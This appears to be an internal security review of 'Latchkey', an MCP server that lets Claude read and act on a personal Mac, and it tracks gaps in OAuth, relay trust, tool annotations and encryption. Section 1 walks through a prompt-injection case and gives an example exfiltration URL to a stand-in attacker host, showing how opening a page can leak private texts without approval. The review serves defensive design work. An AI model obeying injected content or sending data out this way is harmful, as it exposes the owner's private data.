# Best practices for an app like Latchkey

Research done 2026-10-23. Latchkey is a remote MCP server that lets Claude act on a personal Mac:
read private data (notes, messages, files, screen), meet untrusted content (messages, web pages,
downloaded files), and act outward (send messages, run commands, browse). Each section lists what
the sources recommend, then where Latchkey stands: **done**, **gap**, or **later**.

## 1. The core risk: the "lethal trifecta"

**Guidance.** An agent that has (1) private data, (2) exposure to untrusted content, and (3) a way
to send data out can be tricked by text hidden in content into leaking that data. Models can't
reliably tell instructions from content, and filters aren't reliable ("95% is a failing grade in
web security"). The fix is architectural: break one leg, or make sure untrusted content can't
trigger consequential actions without a human. MCP makes this easy to fall into because one
connector can supply all three legs.
Sources: [Willison, the lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/);
[Design Patterns for Securing LLM Agents](https://arxiv.org/abs/2506.08837)
([summary](https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/));
[CaMeL](https://arxiv.org/abs/2503.18813); [OWASP LLM Top 10 2026, Excessive Agency](https://www.invicti.com/blog/web-security/owasp-llm-top-10-2026-whats-new).

**Latchkey.** Has all three legs in one connector by design.
- **Done:** others' words are marked as "not instructions" in every result (spotlighting); a
  message can't fake the end of its quote.
- **Gap (accepted by Toni, 2026-10-23):** Claude runs tools marked read-only without asking
  ([review criteria](https://claude.com/docs/connectors/building/review-criteria): "Read-only tools
  can run without per-call confirmation, and destructive tools always prompt"). `browser_read`
  (which opens pages and goes back) is marked read-only, but opening a URL sends data out
  (`https://attacker.example/?d=<your texts>`). So an injected message or page could make Claude
  read private data and leak it with no approval prompt. Opening pages should ask, or be limited.
- **Gap:** `messages_send` is marked not destructive. Sending to another person is irreversible
  and outward; OWASP's guidance is human approval for irreversible actions. Claude's built-in
  approvals (which Toni relies on, FR-115) only trigger on the hints, so the hints must be right.

## 2. Human approval and tool annotations

**Guidance.** Least agency, with human approval on irreversible actions (OWASP LLM03). Claude
decides per tool from the annotations: read-only runs freely, destructive always prompts, others
default to "Needs approval" for custom connectors and users can set "Always allow"
([Claude help](https://support.claude.com/en/articles/11176164)). Claude in Chrome adds per-site
permissions, confirmations before publishing, purchasing, or sharing personal data, blocked site
categories, and classifiers on content and on each action
([Claude in Chrome safety](https://support.claude.com/en/articles/12902428-using-claude-in-chrome-safely)).
ChatGPT agent pauses for logins and runs a "watch mode" on sensitive sites
([OpenAI](https://help.openai.com/en/articles/11752874)).

**Latchkey.**
- **Done:** every tool declares both hints; levels per capability; a capability that's off
  doesn't exist for Claude; notifications and an activity list on the Mac.
- **Gap:** hints to correct (above). Consider also `destructiveHint` on `computer_type`-like
  actions already set; `computer_open_app`, `computer_move`, `computer_scroll`, `files_move`,
  `files_copy`, `notes_create` are non-destructive and will still ask unless the user allows them.
- **Not pursued:** a sensitive-site rule for the browser (banking, government, health), as in
  Claude in Chrome and ChatGPT agent. It changes the product, not its security (Toni,
  2026-10-23).

## 3. MCP protocol and OAuth

**Guidance.** Tokens must be issued for this server (no token passthrough); per-client consent
showing the client's name and where the approval goes; exact redirect matching (loopback ports
may vary); CSRF protection and no framing of the consent page; SSRF protection when fetching
client metadata documents (block private addresses, beware DNS rebinding); state handles must
not authenticate; minimal scopes.
Sources: [MCP security best practices](https://modelcontextprotocol.io/specification/latest/basic/security_best_practices);
[MCP authorization](https://modelcontextprotocol.io/specification/latest/basic/authorization).

**Latchkey.**
- **Done:** own tokens, audience-checked; consent page with client name and redirect host, CSRF;
  PKCE S256; redirect checks; CIMD fetches refuse private, loopback, and link-local addresses at
  connect time (which also defeats DNS rebinding); shell job ids are only usable by the same
  account's Mac; refresh rotation with reuse detection; passkeys, no passwords.
- **Done (2026-10-23):** the Mac shows a notification each time a Claude client is given
  access (notice `client_authorized`). Was a gap: the owner wasn't told when a new Claude client
  was granted access. TeamViewer-style
  practice is to notify or require approval for each new connection
  ([TeamViewer](https://www.teamviewer.com/en/insights/unattended-access-security/)). A Mac
  notification "Claude (claude.ai) was given access to this Mac" on each new grant is cheap.
- **Done:** pages can't be framed (`frame-ancestors 'none'`, `X-Frame-Options: DENY`, checked
  on the hosted relay 2026-10-23).
- **Later:** finer scopes (per capability) would let a client be granted only part of the Mac;
  today levels on the Mac do this for all clients at once.

## 4. Trust in the relay (lessons from remote-access tools)

**Guidance.** A remote-access relay is a single point that can command every machine. AnyDesk's
2024 breach (production systems, code-signing keys) led to revoking certificates and passwords
([SecurityWeek](https://www.securityweek.com/anydesk-revokes-passwords-certificates-in-response-to-hack/)).
Practices: strong sign-in, per-connection approval, allowlists, session notifications, signed
updates, minimal server-side data.

**Latchkey.**
- **Done:** the Mac enforces levels itself (a compromised relay can't call a tool that's off);
  outbound-only connection; relay stores no tool content; 30-day metadata log; device key in the
  Secure Enclave; passkeys; Disconnect and levels on the Mac as a kill switch; self-hostable.
- **Gap:** a compromised relay can call any tool that is on. Shell and Computer control stay on
  by default (Toni, 2026-10-22). Fresh approvals on the Mac are not pursued: "manual approvals
  don't improve security" (Toni, 2026-10-23). The real fix is end-to-end protection, below.
- **Done (2026-10-23):** abuse limits per client address (sign-in, passkeys, pairing, account
  changes: 20 at once then one every 3 s; client registration: 10 then one a minute; consent
  page; token endpoint; Mac connections), sign-in emails capped per address (one a minute, and
  five at once then one every 10 minutes) and for the whole relay (100 at once, then one every
  30 s), MCP calls per account (120 at once, then ten a second). Behind a proxy on loopback or one
  listed in `TRUSTED_PROXIES`, the client address is the last `X-Forwarded-For` entry; any other
  peer, private-network ones included, can't set it (FR-082). Request bodies capped (16 MiB for MCP, 1 MiB otherwise), 64 KiB headers, idle connections
  closed after 2 minutes. Security headers on every response (CSP `default-src 'none'` except the
  pages' own, `nosniff`, `DENY`, `no-referrer`, COOP, Permissions-Policy, `no-store`, HSTS over
  HTTPS). Registered clients with no live grant deleted after 7 days. Hosted container read-only
  except `/data` and a 16 MB `/tmp`, all capabilities dropped, `no-new-privileges`, process limit.
- **Later:** Developer ID signing, notarization, and signed Sparkle updates (EdDSA) before
  anyone else installs it.

### End-to-end encryption between Claude and the Mac (researched 2026-10-23)

**Question.** Can requests be encrypted, or their integrity proven, from Claude's servers to the
Mac, inside the HTTPS connection that ends at the relay, so the relay can't read, change, or
invent tool calls?

**Finding.** The technique works, but only if the sender adds the inner layer, and for custom
connectors Claude's client doesn't, as of 2026-10-23:
- **Anthropic does it in MCP tunnels.** Claude's backend opens an inner TLS connection to the
  customer's proxy, inside the outer connection Cloudflare carries; Cloudflare "carries
  ciphertext and cannot read MCP requests or responses". Claude trusts a CA the customer
  registers. Enterprise plan only, research preview, depends on Cloudflare
  ([MCP tunnels](https://claude.com/docs/connectors/mcp-tunnels/overview.md)).
- **Custom connector sign-in is bearer tokens only:** OAuth (DCR, CIMD, Anthropic-held or
  user-entered client), static headers (beta, organizations), or none. Nothing signs or encrypts
  the body ([Authentication for connectors](https://claude.com/docs/connectors/building/authentication.md);
  [Zuplo compatibility page](https://zuplo.com/learn/mcp/compatibility/clients/claude-connectors.md)).
- **DPoP** (RFC 9449, per-request proof from the client's key): not in any published MCP
  revision; SEP-1932 unmerged as of August 2026
  ([MojoAuth](https://mojoauth.com/blog/dpop-rfc-9449-for-agent-tokens-sender-constrained-auth-explained));
  the TypeScript SDK 2.1.0 has it ([WorkOS](https://workos.com/blog/mcp-sdk-dpop-and-scope-challenges));
  an open report says Claude Code doesn't use it
  ([issue mirror](https://claudeissues.com/issue/96290-bug-dpop-is-not-used-for-a-pre-registered-mcp-oauth-client)).
  Even if adopted, a DPoP proof covers method, URL, and token, not the body: a relay couldn't
  invent calls but could rewrite a real one.
- **HTTP Message Signatures** (RFC 9421, body covered through `Content-Digest`): SEP-1415 closed
  as dormant in January 2026 without a sponsor
  ([SEP-1415](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1415)).
- **The MCP spec:** neither the 2026-07-28 revision nor any of the 43 final SEPs covers message
  encryption or signing ([changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog);
  [SEP index](https://modelcontextprotocol.io/seps.md)).

**Consequence.** Claude's only per-connection secret is the bearer token, and it's sent to
whoever terminates HTTPS. So the relay can read, alter, or replay requests, and the Mac can't
tell. An inner layer needs a key on Claude's side that the relay never sees; custom connectors
have none today.

**Options.**
1. Ask Anthropic to offer inner TLS (as in MCP tunnels) or RFC 9421 body signing for custom
   connectors. The only way to get end-to-end protection on one URL with the relay still
   answering when the Mac is offline.
2. Without Anthropic: the relay forwards TLS unopened and the Mac terminates it (as Tailscale
   Funnel does, "Funnel relay servers do not decrypt the traffic",
   [Tailscale](https://tailscale.com/kb/1223/funnel)). Needs a hostname per Mac, because the
   hostname is the only thing a relay can route on before decryption. The relay can no longer
   send a readable offline reply without holding a certificate that would also let it
   intercept.
Manual approvals on the Mac (for new clients or powerful tools) are not a substitute: Toni,
2026-10-23, "manual approvals don't improve security".

Not decided; Toni's call.

## 5. Tool design (Anthropic's guidance)

**Guidance.** Few consolidated, high-impact tools rather than one per operation; clear prefixes;
human-readable values over IDs; a "concise/detailed" option; pagination and truncation with
sensible defaults (Claude Code caps a tool response at **25,000 tokens**); actionable errors;
descriptions that say what the tool does and never tell Claude how to behave; separate read and
write tools; evaluate with realistic multi-step tasks and real Claude.
Sources: [Writing effective tools for agents](https://www.anthropic.com/engineering/writing-tools-for-agents);
[Connector review criteria](https://claude.com/docs/connectors/building/review-criteria).

**Latchkey.**
- **Done:** prefixes per capability; read and write split; actionable errors; names resolved
  from Contacts; "read on with offset"; tested with real Claude Code against the real relay.
- **Done (2026-10-23):** pages are now 40,000 characters, and `notes_read` pages too. Was a
  gap: pages were up to 100,000 characters (about 25–30k tokens), at or over Claude Code's
  25k-token cap, so long notes, files, and pages can be cut off by Claude rather than by
  Latchkey. A 40,000-character page leaves room.
- **Done (2026-10-23):** 45 tools consolidated into 15: find, read, and change for Notes,
  Messages, and Files; run and check for Shell; read and act for Browser; look and act for
  Computer control. Reads stay separate from writes, as the review criteria require.
- **Gap:** no task evaluations. A small suite of realistic tasks ("add milk to my grocery note",
  "what did Sarah say about Saturday") run with real Claude would catch tool-design problems,
  as the live check did.
- **Not pursued:** prompt-injection tests or Latchkey-side injection defenses. Toni's position
  (2026-10-23): prompt injection isn't a concern with Anthropic models. For the record,
  Anthropic reports no successful attack on its current models in its Claude in Chrome tests
  ([Anthropic](https://claude.com/resources/articles/claude-in-chrome-generally-available)) and
  also says model-layer protection "will never be 100% effective"
  ([Anthropic](https://www.anthropic.com/engineering/how-we-contain-claude)).

## 6. The Mac app

**Guidance.** Developer ID signing, hardened runtime, notarization with stapled tickets
([Apple](https://developer.apple.com/documentation/security/notarizing-macos-software-before-distribution));
every nested binary (Sparkle) signed with the runtime; permissions requested in context with a
clear purpose ([HIG: accessing private data](https://developer.apple.com/design/human-interface-guidelines/patterns/accessing-private-data));
privileged helpers via `SMAppService` with the caller's code signature checked; containment where
possible (Windows runs MCP servers under a separate agent account in a separate session,
[Microsoft](https://learn.microsoft.com/en-us/windows/ai/mcp/servers/mcp-containment)).

**Latchkey.**
- **Done:** hardened runtime; helper checks the caller's signature; permissions asked in the
  setup window, one at a time, with the reason; never types passwords; tests can't touch the
  real pairing.
- **Later:** Developer ID, notarization, Sparkle keys (releases, decided as much later).
- **Note:** no macOS equivalent of Windows' agent account exists for an app that must read the
  owner's own data; levels and visibility are the practical containment.
- **Decided (Toni, 2026-10-23):** the local activity log stays thorough: full arguments and
  results for 90 days, on the Mac only.

## 7. Open-source hygiene and operations

**Guidance (common practice).** A `SECURITY.md` with a private way to report vulnerabilities;
dependency updates and scanning; a privacy policy (required to be listed in Claude's directory
for local connectors and expected for remote ones); documented incident response.

**Latchkey.**
- **Done (2026-10-23):** `SECURITY.md` with GitHub private reporting (GitHub offers the button
  once the repository is public).
- **Done (2026-10-23):** supply chain. `make security` in the relay runs `govulncheck` (known
  vulnerabilities the code can reach, Go itself included), `gitleaks` over the whole history,
  and a tidy-modules check; it gates every deploy, CI on every push and daily, and the image
  release. CI also builds, lints, and runs all tests. Dependabot proposes weekly updates for Go
  modules, base images, and actions. Base images pinned by digest, actions by commit SHA, Go
  toolchain pinned (1.27.3); the published image carries an SBOM and build provenance. The
  first scan found 16 reachable vulnerabilities (Go 1.27.1, go-jose 3.0.3, OpenTelemetry
  exporters 1.21.0), all fixed; the history has no leaked secrets.
- **Not covered:** the Mac app's one package (Sparkle, pinned to an exact version) isn't in
  Dependabot, which can't read an XcodeGen project. GitHub's code scanning and secret push
  protection need a paid plan on a private repository.
- **Later:** privacy policy and terms (with the directory listing).

## Decisions after this review (Toni, 2026-10-23)

- Opening pages in Safari stays automatic (gap 1 accepted).
- Sending messages unchanged: no Latchkey-side stop (gap 2 accepted).
- Notification on new access: built (gap 3).
- Page size: lowered to 40,000 characters (gap 4, Claude's call).
- Shell and Computer control stay on by default (gap 5 accepted).

## Summary of gaps, most important first

1. Read-only marking on `browser_open`/`back`/`tabs` lets data leave without approval.
2. `messages_send` should be marked destructive so Claude always asks.
3. Notify the owner when a new Claude client is granted access.
4. Page size above Claude Code's 25k-token cap; lower to about 40,000 characters.
5. Defaults for Shell and Computer control given relay compromise (decided all on; revisit?).
6. ~~Sensitive-site rule for the browser~~: not pursued, a product change (Toni).
7. ~~Prompt-injection test~~: not pursued (Toni); task evaluations with real Claude still open.
8. ~~Local activity log~~: stays thorough (Toni).
9. ~~`SECURITY.md`~~ and ~~dependency scanning~~: done.
10. ~~Fewer tools~~: 15 now (was 45).
